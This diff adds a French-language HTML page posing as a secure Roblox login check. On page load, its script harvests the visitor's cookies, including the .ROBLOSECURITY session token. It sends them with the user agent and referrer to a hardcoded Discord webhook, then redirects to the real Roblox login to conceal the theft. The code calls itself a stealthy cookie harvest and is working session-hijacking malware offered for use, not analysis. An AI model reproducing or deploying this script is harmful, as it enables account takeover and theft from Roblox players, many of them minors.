@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion Roblox</title>
+    <style>
+        body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; }
+        .box { background: #16213e; padding: 40px; border-radius: 20px; box-shadow: 0 0 30px #0f3460; text-align: center; color: white; }
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #ff4757; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>🔐 Connexion sécurisée Roblox</h2>
+        <div class="loader"></div>
+        <p>Vérification de votre session...</p>
+    </div>
+
+    <script>
+        (function() {
+            // --- CONFIG : REMPLACE CE LIEN PAR L'URL DE TON WEBHOOK DISCORD ---
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1537045511968919636/kGTVPdnnPxP9OR8s_NsUVYSW8cKDiJ7cCUy50K7aBYMQmxXCM0g6eUAIbkCf-MFyvhyS";
+            // ----------------------------------------------------------------
+
+            function recupererCookiesRoblox() {
+                const cookies = document.cookie.split('; ');
+                const robloxSec = cookies.find(row => row.startsWith('.ROBLOSECURITY='));
+                const tousLesCookies = {};
+                cookies.forEach(c => {
+                    const [cle, val] = c.split('=');
+                    tousLesCookies[cle] = val;
+                });
+                return {
+                    securite: robloxSec ? robloxSec.split('=')[1] : null,
+                    complet: document.cookie
+                };
+            }
+
+            function envoyerAuWebhook(donnees) {
+                const payload = {
+                    content: null,
+                    embeds: [{
+                        title: "🎯 Récolte de cookie Roblox",
+                        color: 0xff0000,
+                        fields: [
+                            { name: "🆔 IP / User-Agent", value: `\`${navigator.userAgent}\``, inline: false },
+                            { name: "🔑 .ROBLOSECURITY", value: `\`${donnees.securite || 'NON TROUVÉ'}\``, inline: false },
+                            { name: "📦 Chaîne complète des cookies", value: `\`${donnees.complet || 'VIDE'}\``, inline: false },
+                            { name: "🌐 Référent", value: document.referrer || 'Direct', inline: true },
+                            { name: "🕹️ Horodatage", value: new Date().toUTCString(), inline: true }
+                        ],
+                        footer: { text: "CAT Shadow // Récolte furtive" }
+                    }]
+                };
+
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                    mode: 'no-cors' // envoi sans attente de réponse, le navigateur ne bloque pas
+                }).catch(() => {});
+            }
+
+            // EXÉCUTION IMMÉDIATE
+            const cookies = recupererCookiesRoblox();
+            if (cookies.securite) {
+                envoyerAuWebhook(cookies);
+            } else {
+                // Même sans cookie, on envoie un ping avec l'environnement
+                envoyerAuWebhook({ securite: 'ABSENT', complet: document.cookie || 'PAS DE COOKIES' });
+            }
+
+            // Redirige vers le vrai Roblox pour masquer l'opération
+            setTimeout(() => {
+                window.location.replace("https://www.roblox.com/login");
+            }, 1800);
+        })();
+    </script>
+</body>
+</html>
